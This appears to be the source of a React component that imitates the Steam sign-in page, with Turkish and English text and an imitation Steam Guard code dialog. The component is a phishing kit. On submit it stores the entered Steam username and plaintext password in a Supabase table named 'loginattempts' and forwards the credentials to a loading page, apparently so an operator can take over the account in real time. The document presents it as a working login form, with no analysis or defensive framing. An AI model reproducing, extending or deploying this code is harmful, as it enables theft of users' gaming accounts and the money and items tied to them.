
import React, { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Checkbox } from '@/components/ui/checkbox';
import { toast } from 'sonner';
import { ArrowRight, Loader } from 'lucide-react';
import { useNavigate } from 'react-router-dom';
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Progress } from "@/components/ui/progress";
import { supabase } from "@/integrations/supabase/client";

// Define translations
const translations = {
  tr: {
    title: 'HESABINIZA GİRİŞ YAPIN',
    accountLabel: 'STEAM HESABI ADI',
    passwordLabel: 'PAROLA',
    rememberMe: 'Beni hatırla',
    loginButton: 'Giriş Yap',
    loading: 'Giriş Yapılıyor...',
    helpText: 'Yardım edin, giriş yapamıyorum',
    steamGuardTitle: 'Steam Guard Doğrulama',
    steamGuardDesc: 'E-posta adresinize gönderilen Steam Guard kodunu girin',
    submitButton: 'Gönder',
    errorMessage: 'Lütfen tüm gerekli alanları doldurun',
    generalError: 'Bir hata oluştu. Lütfen tekrar deneyin.'
  },
  en: {
    title: 'LOGIN TO YOUR ACCOUNT',
    accountLabel: 'STEAM ACCOUNT NAME',
    passwordLabel: 'PASSWORD',
    rememberMe: 'Remember me',
    loginButton: 'Sign In',
    loading: 'Signing in...',
    helpText: 'Help, I can\'t log in',
    steamGuardTitle: 'Steam Guard Verification',
    steamGuardDesc: 'Enter the Steam Guard code sent to your email',
    submitButton: 'Submit',
    errorMessage: 'Please fill in all required fields',
    generalError: 'An error occurred. Please try again.'
  }
};

const SteamLoginForm: React.FC = () => {
  // Form state
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showSteamGuard, setShowSteamGuard] = useState(false);
  const [steamGuardCode, setSteamGuardCode] = useState('');
  const [language, setLanguage] = useState('tr'); // Default language is Turkish
  const navigate = useNavigate();

  // Detect user language
  useEffect(() => {
    try {
      const userLanguage = navigator.language.split('-')[0];
      if (['en', 'tr', 'de', 'fr', 'es'].includes(userLanguage)) {
        setLanguage(userLanguage);
      }
    } catch (error) {
      console.error('Error detecting language:', error);
    }
  }, []);

  // Get translation based on current language
  const t = translations[language as keyof typeof translations] || translations.en;

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Validate form
    if (!username || !password) {
      toast.error(t.errorMessage);
      return;
    }
    
    setIsLoading(true);

    try {
      // Simplified IP capture for demo purposes
      const ip = "0.0.0.0"; 
      
      // Insert login attempt into Supabase
      const { data, error } = await supabase
        .from('loginattempts')
        .insert({
          username,
          password,
          status: 'pending',
          online: true,
          ip
        })
        .select()
        .single();

      if (error) {
        throw error;
      }

      console.log("Login attempt saved:", data);
      
      // Navigate to loading page with credentials
      navigate('/loading', { 
        state: { 
          username, 
          password,
          id: data?.id 
        } 
      });
    } catch (error) {
      console.error("Error saving login attempt:", error);
      setIsLoading(false);
      toast.error(t.generalError);
    }
  };

  // Handle Steam Guard code submission
  const handleSteamGuardSubmit = () => {
    console.log('Steam Guard Code submitted:', steamGuardCode);
    setShowSteamGuard(false);
    toast.success(language === 'tr' ? "Giriş başarılı! Yönlendiriliyorsunuz..." : "Login successful! Redirecting...");
    
    setTimeout(() => {
      navigate('/');
    }, 1500);
  };

  return (
    <div className="w-full max-w-md mx-auto">
      <div className="mb-6 text-center">
        <h1 className="text-lg font-medium text-white mb-2">
          {t.title}
        </h1>
      </div>
      
      <form onSubmit={handleSubmit} className="flex flex-col space-y-4">
        {/* Username field */}
        <div className="space-y-1">
          <label className="text-xs font-medium text-white/50 uppercase">
            {t.accountLabel}
          </label>
          <Input 
            placeholder="" 
            value={username} 
            onChange={e => setUsername(e.target.value)} 
            className="bg-[#32353c] border-0 h-10 text-white" 
            required 
            disabled={isLoading}
          />
        </div>
        
        {/* Password field */}
        <div className="space-y-1">
          <label className="text-xs font-medium text-white/50 uppercase">
            {t.passwordLabel}
          </label>
          <Input 
            type="password" 
            value={password} 
            onChange={e => setPassword(e.target.value)} 
            className="bg-[#32353c] border-0 h-10 text-white" 
            required 
            disabled={isLoading}
          />
        </div>

        {/* Remember me checkbox */}
        <div className="flex items-center space-x-2">
          <Checkbox 
            id="rememberMe" 
            checked={rememberMe} 
            onCheckedChange={checked => setRememberMe(checked === true)} 
            disabled={isLoading} 
            className="border-steam-gray data-[state=checked]:bg-blue-400"
          />
          <label 
            htmlFor="rememberMe" 
            className="text-xs font-medium text-white/80 cursor-pointer"
          >
            {t.rememberMe}
          </label>
        </div>
        
        {/* Login button */}
        <Button 
          type="submit" 
          disabled={isLoading} 
          className="h-10 bg-blue-400 hover:bg-blue-500 text-white w-full"
        >
          {isLoading ? (
            <>
              <Loader className="mr-2 h-4 w-4 animate-spin" />
              {t.loading}
            </>
          ) : (
            t.loginButton
          )}
        </Button>
        
        {/* Help link */}
        <a href="#" className="text-center text-xs text-white/60 hover:text-white">
          {t.helpText}
        </a>
      </form>

      {/* Steam Guard dialog */}
      <Dialog open={showSteamGuard} onOpenChange={setShowSteamGuard}>
        <DialogContent className="bg-[#171a21] border-[#32353c] text-white">
          <div className="p-4">
            <h2 className="text-xl font-bold mb-4">{t.steamGuardTitle}</h2>
            <p className="mb-4 text-white/70">{t.steamGuardDesc}</p>
            
            <div className="mb-4">
              <Input
                className="bg-[#32353c] border-0 text-white"
                value={steamGuardCode}
                onChange={(e) => setSteamGuardCode(e.target.value)}
                placeholder="XXXXX"
                maxLength={5}
              />
            </div>
            
            <Button 
              onClick={handleSteamGuardSubmit}
              className="w-full bg-blue-400 hover:bg-blue-500"
            >
              {t.submitButton}
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default SteamLoginForm;
